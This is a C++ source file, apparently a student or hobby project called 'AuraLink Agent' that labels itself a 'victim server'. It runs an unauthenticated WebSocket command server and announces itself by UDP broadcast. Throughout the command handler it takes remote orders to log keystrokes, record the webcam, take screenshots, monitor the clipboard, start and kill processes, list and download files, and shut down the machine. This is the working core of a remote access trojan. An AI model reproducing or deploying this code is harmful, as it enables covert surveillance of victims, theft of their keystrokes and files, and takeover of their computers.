// =============================================================
// AURALINK SERVER AGENT (MAIN.CPP)
// Nhiệm vụ:
// 1. Mở WebSocket Server (Port 8080) để nhận lệnh từ Admin
// 2. Thực thi các module: Keylog, Webcam, Shell, File Manager...
// 3. Phát tín hiệu UDP Broadcast để báo danh với Registry (Port 8081)
// =============================================================

// --- 1. CẤU HÌNH & THƯ VIỆN HỆ THỐNG ---
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 
#endif

// Thư viện C++ chuẩn
#include <iostream>
#include <string>
#include <thread>
#include <memory>
#include <vector>
#include <fstream>
#include <cstdlib>      
#include <iomanip>
#include <chrono>
#include <atomic> 
#include <sstream>

// Thư viện Boost (Mạng & WebSocket)
#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/ip/udp.hpp> 
#include <boost/asio/strand.hpp>

// Thư viện Windows API
#include <windows.h>   
#include <iphlpapi.h>

// --- 2. CÁC MODULE CHỨC NĂNG (CUSTOM HEADERS) ---
#include "Process.h"
#include "Keylogger.h"
#include "Webcam.h"
#include "Application.h"
#include "ScreenShot.h"
#include "TextToSpeech.h"
#include "Clipboard.h"
#include "FileTransfer.h"

// --- 3. LIÊN KẾT THƯ VIỆN (LINKER) ---
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib") 
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")

// --- 4. NAMESPACE & BIẾN TOÀN CỤC ---
namespace beast = boost::beast;
namespace http = beast::http;
namespace websocket = beast::websocket;
namespace net = boost::asio;
using tcp = boost::asio::ip::tcp;
using udp = boost::asio::ip::udp;

// Biến quản lý luồng quay Webcam
std::thread g_webcamThread;

// Khai báo hàm Shutdown/Restart 
void DoShutdown();
void DoRestart();

// Hàm báo lỗi cơ bản
void fail(beast::error_code ec, char const* what) {
    std::cerr << what << ": " << ec.message() << "\n";
}

// =============================================================
// PHẦN 5: CÁC HÀM TIỆN ÍCH (HELPER FUNCTIONS)
// =============================================================

// Mã hóa Base64 (Dùng để gửi ảnh/video qua socket)
static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string base64_encode(const std::vector<char>& data) {
    std::string ret;
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];
    size_t dataLen = data.size();
    size_t dataPos = 0;
    while (dataLen--) {
        char_array_3[i++] = data[dataPos++];
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; (i < 4); i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
        while ((i++ < 3)) ret += '=';
    }
    return ret;
}

// --- Các hàm lấy thông tin hệ thống (System Info) ---

std::string GetComputerNameStr() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) return std::string(buffer);
    return "Unknown-PC";
}

std::string GetOSVersionStr() {
    std::string osName = "Unknown Windows";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char productName[255] = { 0 };
        DWORD dataSize = sizeof(productName);
        if (RegQueryValueExA(hKey, "ProductName", nullptr, nullptr, (LPBYTE)productName, &dataSize) == ERROR_SUCCESS) {
            osName = std::string(productName);
        }
        char buildStr[32] = { 0 };
        DWORD buildSize = sizeof(buildStr);
        if (RegQueryValueExA(hKey, "CurrentBuild", nullptr, nullptr, (LPBYTE)buildStr, &buildSize) == ERROR_SUCCESS) {
            int buildNumber = std::atoi(buildStr);
            if (buildNumber >= 22000) { 
                size_t pos = osName.find("Windows 10");
                if (pos != std::string::npos) osName.replace(pos, 10, "Windows 11");
            }
        }
        RegCloseKey(hKey);
    }
    return osName;
}

std::string GetRamFree() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    double freeGB = (double)statex.ullAvailPhys / (1024 * 1024 * 1024);
    std::stringstream ss;
    ss << std::fixed << std::setprecision(1) << freeGB << " GB";
    return ss.str();
}

std::string GetRamUsagePercent() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    return std::to_string((int)statex.dwMemoryLoad);
}

std::string GetDiskFree() {
    ULARGE_INTEGER freeBytes, totalBytes, totalFree;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, &totalFree)) {
        double freeGB = (double)freeBytes.QuadPart / (1024 * 1024 * 1024);
        std::stringstream ss;
        ss << std::fixed << std::setprecision(0) << freeGB << " GB";
        return ss.str();
    }
    return "Unknown";
}

std::string GetProcessCount() {
    DWORD count = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do { count++; } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return std::to_string(count);
}

std::string GetCpuUsage() {
    FILETIME idleTime, kernelTime, userTime;
    if (!GetSystemTimes(&idleTime, &kernelTime, &userTime)) return "0";

    static unsigned long long prevTotal = 0;
    static unsigned long long prevIdle = 0;

    unsigned long long total =
        ((unsigned long long)kernelTime.dwHighDateTime << 32 | kernelTime.dwLowDateTime) +
        ((unsigned long long)userTime.dwHighDateTime << 32 | userTime.dwLowDateTime);

    unsigned long long idle =
        ((unsigned long long)idleTime.dwHighDateTime << 32 | idleTime.dwLowDateTime);

    unsigned long long diffTotal = total - prevTotal;
    unsigned long long diffIdle = idle - prevIdle;

    prevTotal = total;
    prevIdle = idle;

    if (diffTotal == 0) return "0";
    double usage = (100.0 * (diffTotal - diffIdle)) / diffTotal;
    if (usage < 0) usage = 0; if (usage > 100) usage = 100;

    return std::to_string((int)usage);
}

std::string GetBatteryStatus() {
    SYSTEM_POWER_STATUS sps;
    if (GetSystemPowerStatus(&sps)) {
        if (sps.BatteryLifePercent == 255) return "Plugged In";
        return std::to_string(sps.BatteryLifePercent) + "%";
    }
    return "Unknown";
}

// =============================================================
// PHẦN 6: AUTO DISCOVERY (UDP BROADCASTER)
// =============================================================
// Luồng này chạy ngầm, liên tục gửi tin hiệu "Tôi ở đây" cho Server Registry

void UDP_Broadcaster_Thread(int targetPort, int myWsPort) {
    try {
        net::io_context ioc;
        udp::socket socket(ioc);
        socket.open(udp::v4());
        socket.set_option(udp::socket::broadcast(true)); // Cho phép Broadcast

        udp::endpoint broadcast_endpoint(net::ip::address_v4::broadcast(), targetPort);

        std::string myName = GetComputerNameStr();
        std::string myOS = GetOSVersionStr();
        std::string myID = "ID-" + myName; // Tạo ID đơn giản

        std::cout << "[UDP] Broadcasting discovery signal to port " << targetPort << "...\n";

        while (true) {
            // Định dạng: REGISTER|ID|Name|OS|Port
            std::string msg = "REGISTER|" + myID + "|" + myName + "|" + myOS + "|" + std::to_string(myWsPort);

            boost::system::error_code ec;
            socket.send_to(net::buffer(msg), broadcast_endpoint, 0, ec);

            if (ec) std::cerr << "[UDP Lỗi] Broadcast failed: " << ec.message() << "\n";

            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }
    catch (std::exception& e) {
        std::cerr << "[UDP Critical Error]: " << e.what() << "\n";
    }
}

// =============================================================
// PHẦN 7: XỬ LÝ KẾT NỐI WEBSOCKET (SESSION)
// =============================================================

class session : public std::enable_shared_from_this<session> {
    websocket::stream<beast::tcp_stream> ws_;
    beast::flat_buffer buffer_;

    std::vector<std::shared_ptr<std::string>> queue_;

public:
    explicit session(tcp::socket&& socket) : ws_(std::move(socket)) {}

    void run() {
        ws_.set_option(websocket::stream_base::timeout::suggested(beast::role_type::server));
        ws_.async_accept(beast::bind_front_handler(&session::on_accept, shared_from_this()));
    }

    void on_accept(beast::error_code ec) {
        if (ec) return fail(ec, "Accept Error");
        do_read(); 
    }

    // --- HÀM GỬI DỮ LIỆU (THREAD-SAFE) ---
    void send(std::string msg) {
        auto self = shared_from_this();
        auto msg_ptr = std::make_shared<std::string>(std::move(msg));

        net::post(ws_.get_executor(), [self, msg_ptr]() {
            if (!self->ws_.is_open()) return;
            self->queue_.push_back(msg_ptr);
            if (self->queue_.size() > 1) return;
            self->do_write();
            });
    }

    void do_write() {
        if (queue_.empty()) return;
        auto const& msg_ptr = queue_.front();
        ws_.text(true);
        ws_.async_write(net::buffer(*msg_ptr),
            beast::bind_front_handler(&session::on_write, shared_from_this()));
    }

    void on_write(beast::error_code ec, std::size_t bytes_transferred) {
        boost::ignore_unused(bytes_transferred);
        if (ec) {
            std::cerr << "Write Error: " << ec.message() << "\n";
            queue_.clear();
            return;
        }
        queue_.erase(queue_.begin());
        if (!queue_.empty()) do_write();
    }

    // --- HÀM ĐỌC DỮ LIỆU ---
    void do_read() {
        ws_.async_read(buffer_, beast::bind_front_handler(&session::on_read, shared_from_this()));
    }

    // --- XỬ LÝ LỆNH TỪ CLIENT (CORE LOGIC) ---
    void on_read(beast::error_code ec, std::size_t bytes_transferred) {
        boost::ignore_unused(bytes_transferred);
        if (ec == websocket::error::closed) return;
        if (ec) return fail(ec, "Read Error");

        if (ws_.got_text()) {
            std::string command = beast::buffers_to_string(buffer_.data());

            static Keylogger myKeylogger;
            static Process myProcessModule;
            static Application myAppModule;
            static Clipboard myClipboard;
            static TextToSpeech myTTS;

            try {
                // 1. Hệ thống & Tài nguyên
                if (command == "get-sys-info") {
                    std::string sysInfo = "sys-info " + GetComputerNameStr() + "|" +
                        GetOSVersionStr() + "|" + GetRamFree() + "|" +
                        GetBatteryStatus() + "|" + GetDiskFree() + "|" +
                        GetProcessCount() + "|" + GetCpuUsage() + "|" +
                        GetRamUsagePercent();
                    send(sysInfo);
                }
                else if (command == "ping") {
                    send("pong");
                }
                // 2. Power
                else if (command == "shutdown") {
                    send("Server: OK, shutting down...");
                    DoShutdown();
                }
                else if (command == "restart") {
                    send("Server: OK, restarting...");
                    DoRestart();
                }
                // 3. Webcam
                else if (command == "capture") {
                    if (g_webcamThread.joinable()) {
                        send("Server: Busy recording...");
                    }
                    else {
                        send("Server: Started recording...");
                        auto self = shared_from_this();
                        g_webcamThread = std::thread([self]() {
                            std::vector<char> videoData = CaptureWebcam(10);
                            if (!videoData.empty()) {
                                std::string encoded = base64_encode(videoData);
                                self->send("file " + encoded);
                            }
                            else {
                                self->send("Server: Webcam capture failed/empty.");
                            }
                            });
                        g_webcamThread.detach();
                    }
                }
                // 4. Screenshot
                else if (command == "screenshot") {
                    int width = GetSystemMetrics(SM_CXSCREEN);
                    int height = GetSystemMetrics(SM_CYSCREEN);
                    std::vector<std::uint8_t> pixels = ScreenShot();
                    if (pixels.empty()) {
                        send("Server: Error capturing screenshot.");
                    }
                    else {
                        std::vector<char> bytes(pixels.begin(), pixels.end());
                        std::string encoded = base64_encode(bytes);
                        send("screenshot " + std::to_string(width) + " " + std::to_string(height) + " " + encoded);
                    }
                }
                // 5. Keylogger
                else if (command == "start-keylog") {
                    myKeylogger.StartKeyLogging();
                    send("Server: Keylogger started...");
                }
                else if (command == "stop-keylog") {
                    myKeylogger.StopKeyLogging();
                    send("Server: Keylogger stopped.");
                }
                else if (command == "get-keylog") {
                    std::string logs = myKeylogger.GetLoggedKeys();
                    send(logs);
                }
                // 6. Quản lý Tiến trình (Process)
                else if (command == "ps") {
                    std::string list = myProcessModule.ListProcesses();
                    send(list);
                }
                else if (command.rfind("start ", 0) == 0) {
                    std::string appName = command.substr(6);
                    if (myProcessModule.StartProcess(appName)) send("Server: Started: " + appName);
                    else send("Server: Error starting: " + appName);
                }
                else if (command.rfind("kill ", 0) == 0) {
                    std::string target = command.substr(5);
                    std::string result = myProcessModule.StopProcess(target);
                    send("Server: " + result);
                }
                // 7. Quản lý Ứng dụng (App)
                else if (command == "list-app") {
                    myAppModule.LoadInstalledApps();
                    auto apps = myAppModule.ListApplicationsWithStatus();
                    if (apps.empty()) { send("Server: No apps found."); }
                    else {
                        std::string msg = "DANH SACH UNG DUNG\n";
                        for (size_t i = 0; i < apps.size(); ++i) {
                            msg += "[" + std::to_string(i) + "] " + apps[i].first.name + (apps[i].second ? " (RUNNING)" : "") + "\n";
                            msg += "Exe: " + apps[i].first.path + "\n";
                        }
                        send(msg);
                    }
                }
                else if (command.rfind("start-app ", 0) == 0) {
                    std::string input = command.substr(10);
                    bool ok = myAppModule.StartApplication(input);
                    send(ok ? "Server: Started " + input : "Server: Failed " + input);
                }
                else if (command.rfind("stop-app ", 0) == 0) {
                    std::string input = command.substr(9);
                    bool ok = myAppModule.StopApplication(input);
                    send(ok ? "Server: Stopped " + input : "Server: Failed stop " + input);
                }
                // 8. Text To Speech
                else if (command.rfind("tts ", 0) == 0) {
                    std::string textToSpeak = command.substr(4);
                    myTTS.Speak(textToSpeak);
                    send("Server: OK, speaking...");
                }
                // 9. Clipboard
                else if (command == "start-clip") {
                    myClipboard.StartMonitoring();
                    send("Server: Clipboard Monitor STARTED...");
                }
                else if (command == "stop-clip") {
                    myClipboard.StopMonitoring();
                    send("Server: Clipboard Monitor STOPPED.");
                }
                else if (command == "get-clip") {
                    std::string logs = myClipboard.GetLogs();
                    if (logs.empty()) logs = "[No clipboard data]";
                    send("CLIPBOARD_DATA:\n" + logs);
                }
                // 10. File Manager (Download & List)
                else if (command.rfind("download-file ", 0) == 0) {
                    std::string filepath = command.substr(14);
                    filepath.erase(0, filepath.find_first_not_of(" \n\r\t"));
                    filepath.erase(filepath.find_last_not_of(" \n\r\t") + 1);
                    std::string response = FileTransfer::HandleDownloadRequest(filepath);
                    send(response);
                }
                else if (command.rfind("ls ", 0) == 0) {
                    std::string path = command.substr(3);
                    std::string result = FileTransfer::ListDirectory(path);
                    send(result);
                }
                else if (command == "ls") {
                    std::string result = FileTransfer::ListDirectory("C:\\");
                    send(result);
                }
            }
            catch (const std::exception& e) {
                std::cerr << "Command Processing Error: " << e.what() << "\n";
            }
        }

        // Xóa buffer và tiếp tục đọc
        buffer_.consume(buffer_.size());
        do_read();
    }
};

// =============================================================
// PHẦN 8: LISTENER (CHẤP NHẬN KẾT NỐI MỚI)
// =============================================================

class listener : public std::enable_shared_from_this<listener> {
    net::io_context& ioc_;
    tcp::acceptor acceptor_;
public:
    listener(net::io_context& ioc, tcp::endpoint endpoint)
        : ioc_(ioc), acceptor_(ioc) {
        beast::error_code ec;
        acceptor_.open(endpoint.protocol(), ec);
        if (ec) { fail(ec, "Open Error"); return; }
        acceptor_.set_option(net::socket_base::reuse_address(true), ec);
        if (ec) { fail(ec, "Set Option Error"); return; }
        acceptor_.bind(endpoint, ec);
        if (ec) { fail(ec, "Bind Error"); return; }
        acceptor_.listen(net::socket_base::max_listen_connections, ec);
        if (ec) { fail(ec, "Listen Error"); return; }
    }
    void run() { do_accept(); }

private:
    void do_accept() {
        acceptor_.async_accept(net::make_strand(ioc_),
            beast::bind_front_handler(&listener::on_accept, shared_from_this()));
    }

    void on_accept(beast::error_code ec, tcp::socket socket) {
        if (ec) fail(ec, "Accept Error");
        else std::make_shared<session>(std::move(socket))->run();
        do_accept();
    }
};

// =============================================================
// PHẦN 9: HÀM MAIN (ENTRY POINT)
// =============================================================

int main() {
    // Hỗ trợ DPI cao cho màn hình hiện đại
    SetProcessDPIAware();

    auto const address = net::ip::make_address("0.0.0.0");
    unsigned short ws_port = 8080;  // Cổng WebSocket nhận lệnh
    unsigned short udp_port = 8081; // Cổng UDP gửi tín hiệu Discovery
    int threads = 1;

    std::cout << "======================================\n";
    std::cout << "   AURALINK AGENT (VICTIM SERVER)     \n";
    std::cout << "======================================\n";
    std::cout << "[INFO] WS Listening on port: " << ws_port << "\n";
    std::cout << "[INFO] Discovery Broadcasting: " << udp_port << "\n";
    std::cout << "--------------------------------------\n";

    // 1. Khởi động luồng UDP Broadcaster (Chạy ngầm)
    std::thread broadcaster(UDP_Broadcaster_Thread, udp_port, ws_port);
    broadcaster.detach();

    // 2. Khởi động WebSocket Server (Main Loop)
    net::io_context ioc{ threads };
    std::make_shared<listener>(ioc, tcp::endpoint{ address, ws_port })->run();
    ioc.run();

    return EXIT_SUCCESS;
}